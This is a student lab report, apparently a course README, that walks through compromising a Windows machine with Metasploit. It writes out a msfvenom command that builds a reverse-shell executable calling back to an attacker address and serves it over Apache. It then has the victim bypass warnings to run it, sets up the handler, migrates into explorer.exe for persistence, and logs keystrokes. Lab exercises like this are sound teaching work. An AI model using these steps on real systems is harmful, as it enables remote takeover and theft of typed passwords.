# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit
### NAME : G LEKASRI
### REGISTER NUMBER : 212223100025
# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:
Find the attackers ip address using ifconfig

## OUTPUT:
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
![eth1](https://github.com/user-attachments/assets/cc1f20b4-3c49-4e72-b5c6-e84c03f3c159)

copy the fun.exe into the apache /var/www/html folder
![eth2](https://github.com/user-attachments/assets/ba842e84-362d-4434-9fa6-4389d8742281)


Start apache server sudo systemctl apache2 start and Check the status of apache2
![eth3](https://github.com/user-attachments/assets/f5a6294d-f89f-4b0a-8eb2-d14e044d4349)



## Invoke msfconsole:
## OUTPUT:

![eth4](https://github.com/user-attachments/assets/d44f09bd-f4a6-4483-ba59-18956817f915)


ype help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![eth5](https://github.com/user-attachments/assets/e357897c-591c-4151-b076-973d867b0d4d)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![eth6](https://github.com/user-attachments/assets/df378756-c9bb-4803-b3e9-3c7ccba9588d)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit 

![eth7](https://github.com/user-attachments/assets/ca5c1c49-34c6-4709-bb20-a85e7fe72560)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![eth8](https://github.com/user-attachments/assets/10ec586e-51e0-4363-afa1-2dd428cecba1)





keyscan_dump Shows the keystrokes captured so far
![eth9](https://github.com/user-attachments/assets/85100400-899d-4c1d-bd55-9bd99f4f2597)




## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
